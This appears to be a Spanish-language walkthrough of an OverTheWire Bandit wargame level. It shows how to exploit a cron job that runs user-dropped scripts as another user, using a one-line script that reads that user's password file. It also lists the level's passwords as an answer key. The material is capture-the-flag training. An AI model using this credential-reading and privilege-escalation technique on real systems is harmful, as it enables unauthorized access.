## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de Acceso al Nivel
- **Puerto:** 2220
##### Se usará el usuario "bandit23":
- **Usuario:** bandit23
- **Contraseña:** 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
##### Después de conseguir la contraseña:
- **Usuario:** bandit24
- **Contraseña descubierta:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
## Solución
```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mktemp -d
/tmp/tmp.1LYfXbqz4K
bandit23@bandit:~$ chmod 777 /tmp/tmp.1LYfXbqz4K
bandit23@bandit:~$ cd /tmp/tmp.1LYfXbqz4K
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.1LYfXbqz4K/password" > script.sh
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.1LYfXbqz4K/password
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ touch password
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ chmod 777 password
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:34 .
drwxrwx-wt 4026 root     root     11063296 Sep  4 16:35 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:34 password
-rw-rw-r--    1 bandit23 bandit23       61 Sep  4 16:33 script.sh
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:34 .
drwxrwx-wt 4027 root     root     11063296 Sep  4 16:35 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:34 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 16:33 script.sh
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ pwd
/tmp/tmp.1LYfXbqz4K
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:34 .
drwxrwx-wt 4029 root     root     11063296 Sep  4 16:37 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:34 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 16:33 script.sh
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.1LYfXbqz4K/password
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ date
Wed Sep  4 04:38:09 PM UTC 2024
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ date
Wed Sep  4 04:38:24 PM UTC 2024
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ date
Wed Sep  4 04:38:37 PM UTC 2024
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

- ##### Cierre de sesión del usuario "bandit23".
```
bandit23@bandit:/tmp/tmp.1LYfXbqz4K$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```
## Notas Adicionales
- **mktemp -d** - Crea una carpeta temporal dentro de /tmp.
## Referencias
- [OverTheWire](https://overthewire.org/wargames/bandit/bandit1.html)